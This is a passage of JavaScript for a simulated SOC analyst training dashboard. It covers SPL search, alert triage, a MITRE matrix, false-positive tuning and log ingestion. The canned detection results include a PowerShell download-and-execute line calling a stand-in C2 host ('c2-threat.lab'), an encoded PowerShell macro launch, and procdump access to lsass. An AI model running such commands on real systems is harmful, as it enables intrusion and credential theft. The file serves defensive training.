  const box = document.getElementById(boxId);
  if (box) {
    box.classList.add('help-hidden');
    showToast('Tip hidden. Toggle "Guide Mode" in header to restore all tips.');
  }
};

// 0. Theme Switcher (Settled Slate / Clean Light)
function initThemeToggle() {
  const toggleBtn = document.getElementById('btn-toggle-theme');
  const icon = document.getElementById('theme-toggle-icon');
  const label = document.getElementById('theme-toggle-label');

  // Check saved theme
  const savedTheme = localStorage.getItem('soc_theme') || 'settled-slate';
  if (savedTheme === 'clean-light') {
    document.body.classList.add('theme-clean-light');
    if (icon) icon.textContent = '🌙';
    if (label) label.textContent = 'Slate Mode';
  } else {
    document.body.classList.remove('theme-clean-light');
    if (icon) icon.textContent = '☀️';
    if (label) label.textContent = 'Light Mode';
  }

  toggleBtn?.addEventListener('click', () => {
    const isLight = document.body.classList.toggle('theme-clean-light');
    if (isLight) {
      localStorage.setItem('soc_theme', 'clean-light');
      if (icon) icon.textContent = '🌙';
      if (label) label.textContent = 'Slate Mode';
      showToast('Switched to Clean Light Theme');
    } else {
      localStorage.setItem('soc_theme', 'settled-slate');
      if (icon) icon.textContent = '☀️';
      if (label) label.textContent = 'Light Mode';
      showToast('Switched to Settled Modern Slate Theme');
    }
  });
}

// 1. Navigation Switching
function initNavigation() {
  const navItems = document.querySelectorAll('.nav-item');
  navItems.forEach(item => {
    item.addEventListener('click', () => {
      const targetTab = item.getAttribute('data-tab');
      switchTab(targetTab);
    });
  });

  // Action buttons from Overview banner
  document.getElementById('btn-inspect-killchain')?.addEventListener('click', () => switchTab('process-tree-dashboard'));
  document.getElementById('btn-view-alerts')?.addEventListener('click', () => switchTab('alert-triage-queue'));
  document.getElementById('btn-open-playbook')?.addEventListener('click', () => {
    switchTab('alert-triage-queue');
    document.querySelector('.detail-tab[data-subtab="subtab-remediation"]')?.click();
  });
  document.getElementById('quick-spl-link')?.addEventListener('click', (e) => {
    e.preventDefault();
    switchTab('spl-search-engine');
  });
}

function switchTab(tabId) {
  SOC_STATE.activeTab = tabId;
  
  // Update sidebar active classes
  document.querySelectorAll('.nav-item').forEach(el => {
    if (el.getAttribute('data-tab') === tabId) {
      el.classList.add('active');
    } else {
      el.classList.remove('active');
    }
  });

  // Update tab panes
  document.querySelectorAll('.tab-pane').forEach(pane => {
    if (pane.id === tabId) {
      pane.classList.add('active');
    } else {
      pane.classList.remove('active');
    }
  });

  if (tabId === 'attack-ratio-visualizer' && typeof renderAttackRatioVisualizer === 'function') {
    setTimeout(renderAttackRatioVisualizer, 40);
  }
}

// 2. Populate Executive Overview Alerts Table
function initOverviewAlerts() {
  const tbody = document.getElementById('overview-alert-rows');
  if (!tbody) return;

  tbody.innerHTML = '';
  SOC_STATE.alerts.forEach(alert => {
    const tr = document.createElement('tr');
    const badgeClass = alert.severity === 'Critical' ? 'badge-critical' : alert.severity === 'High' ? 'badge-high' : 'badge-medium';
    tr.innerHTML = `
      <td><span class="badge-severity ${badgeClass}">${alert.severity}</span></td>
      <td><strong>${alert.title}</strong></td>
      <td><code>${alert.host}</code> / ${alert.user}</td>
      <td><span class="font-mono text-cyan">${alert.mitre}</span></td>
      <td>
        <button class="btn btn-outline-cyan btn-sm" onclick="openAlertInTriage('${alert.id}')">Triage &rarr;</button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}

window.openAlertInTriage = function(alertId) {
  switchTab('alert-triage-queue');
  selectAlert(alertId);
};

// 3. SPL Engine Execution Logic
function initSplEngine() {
  const queryInput = document.getElementById('spl-query-input');
  const runBtn = document.getElementById('btn-run-spl');
  const copyBtn = document.getElementById('btn-copy-spl');
  const presetButtons = document.querySelectorAll('.btn-preset');

  // Default query
  queryInput.value = SPL_PRESETS.bruteforce;
  executeSplQuery(queryInput.value);

  // Preset click
  presetButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      presetButtons.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      const presetKey = btn.getAttribute('data-query-preset');
      queryInput.value = SPL_PRESETS[presetKey];
      executeSplQuery(queryInput.value);
    });
  });

  // Execute button click
  runBtn.addEventListener('click', () => {
    executeSplQuery(queryInput.value);
  });

  // Copy query
  copyBtn.addEventListener('click', () => {
    navigator.clipboard.writeText(queryInput.value).then(() => {
      showToast('Copied SPL query to clipboard!');
    });
  });

  // Live filter results input
  document.getElementById('spl-filter-results')?.addEventListener('input', (e) => {
    const term = e.target.value.toLowerCase();
    const rows = document.querySelectorAll('#spl-table-body tr');
    rows.forEach(r => {
      r.style.display = r.textContent.toLowerCase().includes(term) ? '' : 'none';
    });
  });
}

function executeSplQuery(queryText) {
  const tableHead = document.getElementById('spl-table-head');
  const tableBody = document.getElementById('spl-table-body');
  const countDisplay = document.getElementById('spl-count-display');
  const timerDisplay = document.getElementById('spl-timer-display');

  const startTime = performance.now();
  let results = [];
  let columns = [];

  const lowerQuery = queryText.toLowerCase();

  if (lowerQuery.includes('4625') || lowerQuery.includes('password spraying')) {
    columns = ['_time', 'IpAddress', 'TargetUserName', 'EventCode', 'Status', 'Reason', 'attack_type'];
    results = [
      { _time: "14:32:01", IpAddress: "198.51.100.45", TargetUserName: "administrator", EventCode: 4625, Status: "0xC000006A", Reason: "Bad password", attack_type: "Password Spraying" },
      { _time: "14:32:04", IpAddress: "198.51.100.45", TargetUserName: "administrator", EventCode: 4625, Status: "0xC000006A", Reason: "Bad password", attack_type: "Password Spraying" },
      { _time: "14:32:12", IpAddress: "198.51.100.45", TargetUserName: "svc_sql", EventCode: 4625, Status: "0xC000006A", Reason: "Bad password", attack_type: "Password Spraying" },
      { _time: "14:32:15", IpAddress: "198.51.100.45", TargetUserName: "jdoe", EventCode: 4625, Status: "0xC000006A", Reason: "Bad password", attack_type: "Password Spraying" },
      { _time: "14:32:19", IpAddress: "198.51.100.45", TargetUserName: "asmith", EventCode: 4625, Status: "0xC000006A", Reason: "Bad password", attack_type: "Password Spraying" },
      { _time: "14:32:22", IpAddress: "198.51.100.45", TargetUserName: "bwilson", EventCode: 4625, Status: "0xC000006A", Reason: "Bad password", attack_type: "Password Spraying" },
      { _time: "14:32:26", IpAddress: "198.51.100.45", TargetUserName: "cjohnson", EventCode: 4625, Status: "0xC000006A", Reason: "Bad password", attack_type: "Password Spraying" },
      { _time: "14:32:30", IpAddress: "198.51.100.45", TargetUserName: "dharris", EventCode: 4625, Status: "0xC000006A", Reason: "Bad password", attack_type: "Password Spraying" }
    ];
  } else if (lowerQuery.includes('winword') || lowerQuery.includes('macro')) {
    columns = ['_time', 'Computer', 'User', 'ParentImage', 'Image', 'CommandLine', 'Obfuscation'];
    results = [
      { _time: "15:10:12", Computer: "FIN-WS-09", User: "CORP\\cjohnson", ParentImage: "C:\\Program Files\\...\\WINWORD.EXE", Image: "powershell.exe", CommandLine: "powershell.exe -NoProfile -ExecutionPolicy Bypass -Enc SQBFAFgA...", Obfuscation: "HIGH_CONFIDENCE (Base64)" }
    ];
  } else if (lowerQuery.includes('4104') || lowerQuery.includes('downloadstring')) {
    columns = ['_time', 'Computer', 'User', 'SuspicionScore', 'ScriptBlockText'];
    results = [
      { _time: "15:10:14", Computer: "FIN-WS-09", User: "CORP\\cjohnson", SuspicionScore: 90, ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://c2-threat.lab/stage2.ps1'); [System.Reflection.Assembly]::Load($payload);" }
    ];
  } else if (lowerQuery.includes('lsass') || lowerQuery.includes('0x1fffff')) {
    columns = ['_time', 'Computer', 'SourceImage', 'TargetImage', 'GrantedAccess', 'ThreatLevel'];
    results = [
      { _time: "15:12:05", Computer: "FIN-WS-09", SourceImage: "C:\\Windows\\Temp\\procdump64.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1fffff", ThreatLevel: "CRITICAL_DUMP" }
    ];
  } else if (lowerQuery.includes('beacon') || lowerQuery.includes('4444')) {
    columns = ['SourceIp', 'DestIp', 'DestPort', 'count', 'Binary', 'Status'];
    results = [
      { SourceIp: "192.168.10.42", DestIp: "185.220.101.5", DestPort: 4444, count: 3, Binary: "beacon.exe", Status: "Periodic C2 Beacon (30s delta)" }
    ];
  } else {
    columns = ['_time', 'index', 'EventCode', 'Computer', 'User', 'Status'];
    results = SOC_STATE.allEvents;
  }

  const elapsed = Math.round(performance.now() - startTime + 8);
  countDisplay.textContent = `Returned ${results.length} events`;
  timerDisplay.textContent = `(Latency: ${elapsed}ms | 0 syntax errors | Index scan: 100%)`;

  // Render Table Header
  tableHead.innerHTML = `<tr>${columns.map(col => `<th>${col}</th>`).join('')}</tr>`;

  // Render Table Body
  tableBody.innerHTML = results.map(row => {
    return `<tr>${columns.map(col => {
      const val = row[col] !== undefined ? row[col] : '-';
      const isCode = col === 'CommandLine' || col === 'ScriptBlockText' || col === 'GrantedAccess' || col === 'Status';
      return `<td class="${isCode ? 'font-mono text-cyan' : ''}">${escapeHtml(String(val))}</td>`;
    }).join('')}</tr>`;
  }).join('');
}

function escapeHtml(str) {
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

// 4. Alert Triage Queue & Workbench
function initTriageQueue() {
  renderTriageCards('all');

  // Filter buttons (All / Critical / High)
  const filterBtns = document.querySelectorAll('.triage-filter-btn');
  filterBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      filterBtns.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      renderTriageCards(btn.getAttribute('data-filter'));
    });
  });

  // Subtabs inside Alert Detail (Raw / Correlation / Sigma / Remediation)
  const subtabs = document.querySelectorAll('.detail-tab');
  subtabs.forEach(tab => {
    tab.addEventListener('click', () => {
      subtabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');

      const targetId = tab.getAttribute('data-subtab');
      document.querySelectorAll('.detail-subtab-content').forEach(pane => {
        pane.classList.remove('active');
      });
      document.getElementById(targetId)?.classList.add('active');
    });
  });

  // Action Buttons
  document.getElementById('btn-tag-tp')?.addEventListener('click', () => {
    showToast('Tagged Alert as Confirmed True Positive (TP)');
  });
  document.getElementById('btn-tag-fp')?.addEventListener('click', () => {
    showToast('Tagged Alert as False Positive (FP) -> Exported to Tuning Queue');
  });
  document.getElementById('btn-copy-raw-event')?.addEventListener('click', () => {
    const jsonText = document.getElementById('detail-raw-json').textContent;
    navigator.clipboard.writeText(jsonText).then(() => showToast('Copied Raw Event JSON!'));
  });
  document.getElementById('btn-copy-sigma')?.addEventListener('click', () => {
    const yamlText = document.getElementById('detail-sigma-yaml').textContent;
    navigator.clipboard.writeText(yamlText).then(() => showToast('Copied Sigma YAML Rule!'));
  });

  // Select first alert initially
  selectAlert('ALT-01');
}

function renderTriageCards(filterLevel) {
  const container = document.getElementById('triage-cards-container');
  if (!container) return;

  container.innerHTML = '';
  const filtered = SOC_STATE.alerts.filter(a => filterLevel === 'all' || a.severity === filterLevel);

  filtered.forEach(alert => {
    const card = document.createElement('div');
    card.className = `alert-card-item ${alert.id === SOC_STATE.selectedAlertId ? 'selected' : ''}`;
    card.id = `card-${alert.id}`;
    const badgeClass = alert.severity === 'Critical' ? 'badge-critical' : alert.severity === 'High' ? 'badge-high' : 'badge-medium';

    card.innerHTML = `
      <div class="alert-card-header">
        <span class="badge-severity ${badgeClass}">${alert.severity}</span>
        <span class="font-mono text-cyan" style="font-size: 0.68rem;">${alert.mitre}</span>
      </div>
      <div class="alert-card-title">${alert.title}</div>
      <div class="alert-card-meta">
        <span>${alert.host}</span>
        <span>${alert.time.split(' ')[1]}</span>
      </div>
    `;

    card.addEventListener('click', () => selectAlert(alert.id));
    container.appendChild(card);
  });
}

function selectAlert(alertId) {
  SOC_STATE.selectedAlertId = alertId;
  const alert = SOC_STATE.alerts.find(a => a.id === alertId);
  if (!alert) return;

  // Highlight card
  document.querySelectorAll('.alert-card-item').forEach(c => c.classList.remove('selected'));
  document.getElementById(`card-${alertId}`)?.classList.add('selected');

  // Populate Details
  const sevBadge = document.getElementById('detail-severity');
  sevBadge.textContent = `${alert.severity.toUpperCase()}`;
  sevBadge.className = `badge-severity ${alert.severity === 'Critical' ? 'badge-critical' : alert.severity === 'High' ? 'badge-high' : 'badge-medium'}`;

  document.getElementById('detail-mitre-tag').textContent = `MITRE: ${alert.mitre}`;
  document.getElementById('detail-time').textContent = alert.time;
  document.getElementById('detail-title').textContent = alert.title;
  document.getElementById('detail-host').textContent = alert.host;
  document.getElementById('detail-user').textContent = alert.user;
  document.getElementById('detail-src-ip').textContent = alert.srcIp;

  // Raw JSON
  document.getElementById('detail-raw-json').textContent = JSON.stringify(alert.rawEvent, null, 2);

  // Sigma YAML
  document.getElementById('detail-sigma-yaml').textContent = alert.sigmaYaml;
}

// 5. MITRE ATT&CK Matrix Renderer
function initMitreMatrix() {
  const grid = document.getElementById('mitre-matrix-grid');
  if (!grid) return;

  grid.innerHTML = '';
  SOC_STATE.mitreMatrix.forEach(col => {
    const colEl = document.createElement('div');
    colEl.className = 'mitre-column';
    colEl.innerHTML = `
      <div class="mitre-col-header">${col.tactic}</div>
      <div class="mitre-cards-list">
        ${col.techniques.map(t => `
          <div class="mitre-technique-card ${t.detected ? 'active-threat' : ''}" title="${t.detected ? 'Threat Detected by Rule ' + t.rule : 'No detections'}">
            <span class="tech-id">${t.id}</span>
            <span>${t.name}</span>
          </div>
        `).join('')}
      </div>
    `;
    grid.appendChild(colEl);
  });
}

// 6. False Positive Tuning Sandbox
function initTuningSandbox() {
  const sliderThresh = document.getElementById('slider-threshold');
  const sliderWindow = document.getElementById('slider-timewindow');
  const toggleWhitelist = document.getElementById('toggle-whitelist');
  const toggleMachine = document.getElementById('toggle-machine-accounts');

  function calculateTuning() {
    const thresh = parseInt(sliderThresh.value, 10);
    const windowSec = parseInt(sliderWindow.value, 10);
    const hasWhitelist = toggleWhitelist.checked;
    const hasMachine = toggleMachine.checked;

    document.getElementById('val-threshold').textContent = `${thresh} attempts`;
    document.getElementById('val-timewindow').textContent = `${windowSec} seconds`;

    let baseWeekly = 1420;
    let reductionPct = 0;

    if (hasWhitelist) reductionPct += 24.5;
    if (hasMachine) reductionPct += 8.2;
    if (thresh >= 10) reductionPct += (thresh - 5) * 0.8;
    if (windowSec <= 60) reductionPct += 3.5;

    reductionPct = Math.min(Math.max(reductionPct, 2.0), 65.0);
    const tunedWeekly = Math.round(baseWeekly * (1 - reductionPct / 100));
    const fpr = Math.max(8.5, (48.6 - reductionPct)).toFixed(1);
    const mttt = (14.2 * (1 - reductionPct / 120)).toFixed(1);

    document.getElementById('sim-alert-volume').textContent = `${tunedWeekly.toLocaleString()} alerts / week`;
    document.getElementById('sim-reduction-pct').textContent = `-${reductionPct.toFixed(1)}% Noise Reduction`;
    document.getElementById('sim-fpr').textContent = `${fpr}%`;
    document.getElementById('sim-mttt').textContent = `${mttt} min`;

    const verdict = document.getElementById('sim-verdict');
    if (reductionPct >= 30 && reductionPct <= 45) {
      verdict.innerHTML = `<span class="verdict-icon">✅</span><span><strong>Optimal Goldilocks Zone:</strong> Maximum false-positive suppression (~${reductionPct.toFixed(1)}%) without missing real spray attacks.</span>`;
      verdict.style.borderColor = 'rgba(0, 230, 118, 0.4)';
    } else if (reductionPct > 45) {
      verdict.innerHTML = `<span class="verdict-icon">⚠️</span><span><strong>Over-Tuned:</strong> High threshold may introduce blindspots for stealthy low-and-slow attacks.</span>`;
      verdict.style.borderColor = 'rgba(245, 158, 11, 0.4)';
    } else {
      verdict.innerHTML = `<span class="verdict-icon">ℹ️</span><span><strong>Under-Tuned:</strong> High alert noise will lead to SOC L1 analyst alert fatigue.</span>`;
      verdict.style.borderColor = 'rgba(0, 242, 254, 0.4)';
    }
  }

  sliderThresh?.addEventListener('input', calculateTuning);
  sliderWindow?.addEventListener('input', calculateTuning);
  toggleWhitelist?.addEventListener('change', calculateTuning);
  toggleMachine?.addEventListener('change', calculateTuning);

  calculateTuning();
}

// 7. Incident Modal & Export Report
function initIncidentModal() {
  const modal = document.getElementById('incident-modal');
  const openBtn = document.getElementById('btn-escalate-ticket');
  const closeBtn = document.getElementById('btn-close-modal');
  const cancelBtn = document.getElementById('btn-modal-cancel');
  const submitBtn = document.getElementById('btn-modal-submit');

  const exportBtn = document.getElementById('btn-export-incident');
  const reportModal = document.getElementById('report-modal');
  const closeReportBtn = document.getElementById('btn-close-report-modal');
  const cancelReportBtn = document.getElementById('btn-cancel-report-modal');
  const downloadPdfBtn = document.getElementById('btn-download-pdf');

  openBtn?.addEventListener('click', () => {
    modal?.classList.add('show');
  });

  const closeModal = () => modal?.classList.remove('show');
  closeBtn?.addEventListener('click', closeModal);
  cancelBtn?.addEventListener('click', closeModal);
  modal?.addEventListener('click', (e) => {
    if (e.target === modal) closeModal();
  });

  submitBtn?.addEventListener('click', () => {
    closeModal();
    showToast('Incident Ticket INC-2026-0418-092 escalated to Tier-2 IR Team!');
  });

  // Report Modal Handlers
  exportBtn?.addEventListener('click', (e) => {
    e.preventDefault();
    if (reportModal) {
      reportModal.classList.add('show');
      showToast('Opening Executive Incident Forensics Report...');
    }
  });

  const closeReportModal = () => reportModal?.classList.remove('show');
  closeReportBtn?.addEventListener('click', closeReportModal);
  cancelReportBtn?.addEventListener('click', closeReportModal);
  reportModal?.addEventListener('click', (e) => {
    if (e.target === reportModal) closeReportModal();
  });

  downloadPdfBtn?.addEventListener('click', () => {
    showToast('Preparing publication-ready PDF print...');
    const printWindow = window.open('reports/SOC_Executive_Report_Printable.html', '_blank');
    if (printWindow) {
      printWindow.focus();
      setTimeout(() => {
        try {
          printWindow.print();
        } catch (err) {
          console.log('Print dialog triggered in new window.');
        }
      }, 500);
    } else {
      window.location.href = 'reports/SOC_Executive_Report_Printable.html';
    }
  });
}

// 8. Live Ingest EPS & Fluctuation Simulator
function initLiveCounters() {
  const epsEl = document.getElementById('eps-counter');
  if (!epsEl) return;

  setInterval(() => {
    const base = 1420;
    const variation = Math.floor(Math.random() * 60) - 30;
    epsEl.textContent = `${(base + variation).toLocaleString()} EPS`;
  }, 2500);
}

// 9. Custom Log Ingest, Telemetry Repository & High-Performance Threat Analyzer
let ANALYZER_STATE = {
  rawEvents: [],
  filteredEvents: [],
  ipCounts: {},
  userSet: new Set(),
  detectedThreats: [],
  uploadedFilesRepository: new Map([
    ['1_password_spray_attack.log', 'Built-in Practice Log: Password Spray (Event 4625)'],
    ['2_phishing_macro_powershell.json', 'Built-in Practice Log: Malicious Macro (4104)'],
    ['3_lsass_dump_and_c2.csv', 'Built-in Practice Log: LSASS Dump & C2 (Sysmon 10/3)'],
    ['4_multi_stage_apt_intrusion.json', 'Built-in Practice Log: Multi-Stage APT Chain'],
    ['5_normal_enterprise_baseline.log', 'Built-in Practice Log: Clean Enterprise Baseline']
  ]),
  pendingCollisionFile: null,
  pagination: {
    currentPage: 1,
    pageSize: 15,
    totalPages: 1
  }
};

function initLogAnalyzer() {
  const dropZone = document.getElementById('log-drop-zone');
  const fileInput = document.getElementById('log-file-input');

  // Quick sample buttons
  const btnSpray = document.getElementById('btn-load-sample-spray');
  const btnMacro = document.getElementById('btn-load-sample-macro');
  const btnSysmon = document.getElementById('btn-load-sample-sysmon');
  const btnAll = document.getElementById('btn-load-sample-all');
  const sampleBtns = [btnSpray, btnMacro, btnSysmon, btnAll];

  // Filters
  const searchInput = document.getElementById('analyzer-search-input');
  const timeFilter = document.getElementById('analyzer-time-filter');
  const pathFilter = document.getElementById('analyzer-path-filter');
  const eventFilter = document.getElementById('analyzer-event-filter');
  const statusFilter = document.getElementById('analyzer-status-filter');
  const userFilter = document.getElementById('analyzer-user-filter');
  const ipRepeatFilter = document.getElementById('analyzer-ip-repeat-filter');
  const threatCatFilter = document.getElementById('analyzer-threat-category-filter');
  const btnReset = document.getElementById('btn-reset-analyzer-filters');

  // Pagination Controls
  const pageSizeSelect = document.getElementById('pagination-page-size');
  const btnFirst = document.getElementById('btn-page-first');
  const btnPrev = document.getElementById('btn-page-prev');
  const btnNext = document.getElementById('btn-page-next');
  const btnLast = document.getElementById('btn-page-last');

  // File Upload Handlers
  dropZone?.addEventListener('click', () => fileInput?.click());
  fileInput?.addEventListener('change', (e) => {
    if (e.target.files && e.target.files[0]) {
      handleUploadedFileWithCollisionCheck(e.target.files[0]);
    }
  });

  dropZone?.addEventListener('dragover', (e) => {
    e.preventDefault();
    dropZone.classList.add('dragover');
  });
  dropZone?.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
  dropZone?.addEventListener('drop', (e) => {
    e.preventDefault();
    dropZone.classList.remove('dragover');
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleUploadedFileWithCollisionCheck(e.dataTransfer.files[0]);
    }
  });

  // Collision Mitigation Handlers
  function handleUploadedFileWithCollisionCheck(file) {
    if (ANALYZER_STATE.uploadedFilesRepository.has(file.name)) {
      // Trigger File Collision Modal
      ANALYZER_STATE.pendingCollisionFile = file;
      const modal = document.getElementById('file-collision-modal');
      const filenameLabel = document.getElementById('collision-filename');
      const versionLabel = document.getElementById('collision-version-label');

      const parts = file.name.split('.');
      const ext = parts.pop();
      const base = parts.join('.');
      const versionedName = `${base}_v2.${ext}`;

      if (filenameLabel) filenameLabel.textContent = file.name;
      if (versionLabel) versionLabel.textContent = versionedName;
      if (modal) modal.classList.add('show');
      return;
    }

    // Proceed directly if no collision
    ANALYZER_STATE.uploadedFilesRepository.set(file.name, `User Uploaded: ${file.name}`);
    executeStreamIngestion(file, file.name);
  }

  // Wire Collision Modal Buttons
  const collisionModal = document.getElementById('file-collision-modal');
  const btnOverwrite = document.getElementById('btn-collision-overwrite');
  const btnVersion = document.getElementById('btn-collision-version');
  const btnMerge = document.getElementById('btn-collision-merge');
  const btnCancel = document.getElementById('btn-collision-cancel');
  const btnCloseCollision = document.getElementById('btn-close-collision');

  const closeCollisionModal = () => collisionModal?.classList.remove('show');
  btnCloseCollision?.addEventListener('click', closeCollisionModal);
  btnCancel?.addEventListener('click', () => {
    closeCollisionModal();
    ANALYZER_STATE.pendingCollisionFile = null;
    showToast('File upload cancelled.');
  });

  btnOverwrite?.addEventListener('click', () => {
    const file = ANALYZER_STATE.pendingCollisionFile;
    closeCollisionModal();
    if (file) {
      showToast(`Overwriting active telemetry with ${file.name}`);
      executeStreamIngestion(file, file.name, 'overwrite');
    }
  });

  btnVersion?.addEventListener('click', () => {
    const file = ANALYZER_STATE.pendingCollisionFile;
    closeCollisionModal();
    if (file) {
      const parts = file.name.split('.');
      const ext = parts.pop();
      const base = parts.join('.');
      const vName = `${base}_v2.${ext}`;
      ANALYZER_STATE.uploadedFilesRepository.set(vName, `User Version: ${vName}`);
      showToast(`Ingesting as new version: ${vName}`);
      executeStreamIngestion(file, vName, 'version');
    }
  });

  btnMerge?.addEventListener('click', () => {
    const file = ANALYZER_STATE.pendingCollisionFile;
    closeCollisionModal();
    if (file) {
      showToast(`Merging ${file.name} with live telemetry stream...`);
      executeStreamIngestion(file, file.name, 'merge');
    }
  });

  // High-Speed Chunked Streaming File Processor
  function executeStreamIngestion(file, finalLabel, mode = 'overwrite') {
    const progressWrap = document.getElementById('upload-progress-wrap');
    const progressFill = document.getElementById('upload-progress-fill');
    const progressText = document.getElementById('progress-status-text');
    const progressPct = document.getElementById('progress-percent');

    if (progressWrap) progressWrap.style.display = 'block';
    if (progressFill) progressFill.style.width = '15%';
    if (progressText) progressText.textContent = `Streaming ${finalLabel} (${(file.size / 1024).toFixed(1)} KB)...`;
    if (progressPct) progressPct.textContent = '15%';

    const startTime = performance.now();

    const reader = new FileReader();
    reader.onprogress = (e) => {
      if (e.lengthComputable) {
        const pct = Math.round((e.loaded / e.total) * 75);
        if (progressFill) progressFill.style.width = `${pct}%`;
        if (progressPct) progressPct.textContent = `${pct}%`;
      }
    };

    reader.onload = (event) => {
      if (progressFill) progressFill.style.width = '90%';
      if (progressPct) progressPct.textContent = '90%';
      if (progressText) progressText.textContent = 'Normalizing fields and correlating threat vectors...';

      setTimeout(() => {
        try {
          const text = event.target.result;
          let parsed = [];
          if (file.name.endsWith('.json')) {
            parsed = JSON.parse(text);
            if (!Array.isArray(parsed)) parsed = [parsed];
          } else if (file.name.endsWith('.csv')) {
            parsed = parseCsvToEvents(text);
          } else {
            parsed = parseRawLogText(text);
          }

          let finalEvents = parsed;
          if (mode === 'merge') {
            finalEvents = [...ANALYZER_STATE.rawEvents, ...parsed];
          }

          const elapsed = (performance.now() - startTime).toFixed(1);
          if (progressFill) progressFill.style.width = '100%';
          if (progressPct) progressPct.textContent = '100%';
          if (progressText) progressText.textContent = `Stream finished in ${elapsed}ms!`;

          sampleBtns.forEach(b => b?.classList.remove('active'));
          processAndRenderIngestedLogs(finalEvents, finalLabel, elapsed);
          syncSocPlatformWithDataset(finalEvents, finalLabel);

          showToast(`⚡ Ingestion Complete: ${finalEvents.length.toLocaleString()} events active across SOC!`);

          setTimeout(() => {
            if (progressWrap) progressWrap.style.display = 'none';
          }, 1800);
        } catch (err) {
          if (progressWrap) progressWrap.style.display = 'none';
          showToast('Parsing error: ' + err.message);
        }
      }, 30);
    };

    reader.readAsText(file);
  }

  // Practice Log Library Loader (Global)
  window.loadPracticeFile = function(fileName) {
    sampleBtns.forEach(b => b?.classList.remove('active'));

    let dataset = SOC_STATE.allEvents;
    let label = fileName;

    if (fileName.includes('1_password_spray')) {
      dataset = SOC_STATE.rawAuthEvents;
      btnSpray?.classList.add('active');
    } else if (fileName.includes('2_phishing_macro')) {
      dataset = SOC_STATE.rawMacroEvents;
      btnMacro?.classList.add('active');
    } else if (fileName.includes('3_lsass_dump')) {
      dataset = SOC_STATE.rawSysmonEvents;
      btnSysmon?.classList.add('active');
    } else if (fileName.includes('4_multi_stage')) {
      dataset = SOC_STATE.allEvents;
      btnAll?.classList.add('active');
    } else if (fileName.includes('5_normal_enterprise')) {
      dataset = SOC_STATE.normalBaselineEvents;
    }

    processAndRenderIngestedLogs(dataset, `Practice File: ${fileName}`, '0.8');
    syncSocPlatformWithDataset(dataset, fileName);
    showToast(`Loaded Practice Scenario: ${fileName}`);
  };

  // 1-Click Sample Loaders
  btnSpray?.addEventListener('click', () => window.loadPracticeFile('1_password_spray_attack.log'));
  btnMacro?.addEventListener('click', () => window.loadPracticeFile('2_phishing_macro_powershell.json'));
  btnSysmon?.addEventListener('click', () => window.loadPracticeFile('3_lsass_dump_and_c2.csv'));
  btnAll?.addEventListener('click', () => window.loadPracticeFile('4_multi_stage_apt_intrusion.json'));

  // Debounced Search and Multi-Field Filters
  let searchDebounceTimer;
  searchInput?.addEventListener('input', () => {
    clearTimeout(searchDebounceTimer);
    searchDebounceTimer = setTimeout(applyAnalyzerFilters, 100);
  });

  timeFilter?.addEventListener('change', applyAnalyzerFilters);
  pathFilter?.addEventListener('change', applyAnalyzerFilters);
  eventFilter?.addEventListener('change', applyAnalyzerFilters);
  statusFilter?.addEventListener('change', applyAnalyzerFilters);
  userFilter?.addEventListener('change', applyAnalyzerFilters);
  ipRepeatFilter?.addEventListener('change', applyAnalyzerFilters);
  threatCatFilter?.addEventListener('change', applyAnalyzerFilters);

  btnReset?.addEventListener('click', () => {
    if (searchInput) searchInput.value = '';
    if (timeFilter) timeFilter.value = 'all';
    if (pathFilter) pathFilter.value = 'all';
    if (eventFilter) eventFilter.value = 'all';
    if (statusFilter) statusFilter.value = 'all';
    if (userFilter) userFilter.value = 'all';
    if (ipRepeatFilter) ipRepeatFilter.value = 'all';
    if (threatCatFilter) threatCatFilter.value = 'all';
    applyAnalyzerFilters();
    showToast('All multi-field filters reset to default view.');
  });

  // Pagination Event Listeners
  pageSizeSelect?.addEventListener('change', () => {
    ANALYZER_STATE.pagination.pageSize = parseInt(pageSizeSelect.value, 10);
    ANALYZER_STATE.pagination.currentPage = 1;
    renderPaginatedTable();
  });

  btnFirst?.addEventListener('click', () => {
    if (ANALYZER_STATE.pagination.currentPage > 1) {
      ANALYZER_STATE.pagination.currentPage = 1;
      renderPaginatedTable();
    }
  });

  btnPrev?.addEventListener('click', () => {
    if (ANALYZER_STATE.pagination.currentPage > 1) {
      ANALYZER_STATE.pagination.currentPage--;
      renderPaginatedTable();
    }
  });

  btnNext?.addEventListener('click', () => {
    if (ANALYZER_STATE.pagination.currentPage < ANALYZER_STATE.pagination.totalPages) {
      ANALYZER_STATE.pagination.currentPage++;
      renderPaginatedTable();
    }
  });

  btnLast?.addEventListener('click', () => {
    if (ANALYZER_STATE.pagination.currentPage < ANALYZER_STATE.pagination.totalPages) {
      ANALYZER_STATE.pagination.currentPage = ANALYZER_STATE.pagination.totalPages;
      renderPaginatedTable();
    }
  });

  // Initial Load with Default Telemetry
  processAndRenderIngestedLogs(SOC_STATE.allEvents, 'Full Attack Telemetry (Default)', '1.2');
}

// Global Synchronization: Updates All SOC Tabs & Dashboards to Run on the Uploaded File
function syncSocPlatformWithDataset(events, sourceLabel) {
  SOC_STATE.allEvents = events;

  // 1. Update Executive Dashboard Counters
  const statEvents = document.getElementById('stat-total-events');
  const statAlerts = document.getElementById('stat-active-alerts');
  const statHosts = document.getElementById('stat-hosts-monitored');

  const distinctHosts = new Set(events.map(e => e.Computer || 'DC01.CORP.LOCAL')).size;
  const threatCount = (ANALYZER_STATE.detectedThreats || []).length;

  if (statEvents) statEvents.textContent = `${events.length.toLocaleString()} Events`;
  if (statAlerts) statAlerts.textContent = `${threatCount} Threat Rules Triggered`;
  if (statHosts) statHosts.textContent = `${distinctHosts} Monitored Endpoints`;

  // 2. Sync Incident Escalation Ticket ID
  const ticketIdInput = document.getElementById('modal-ticket-id');
  if (ticketIdInput) {
    const timestampTag = new Date().toISOString().slice(0, 10).replace(/-/g, '');
    ticketIdInput.value = `INC-${timestampTag}-${String(events.length).padStart(3, '0')}`;
  }

  // 3. Sync Attack Ratio Visualizer
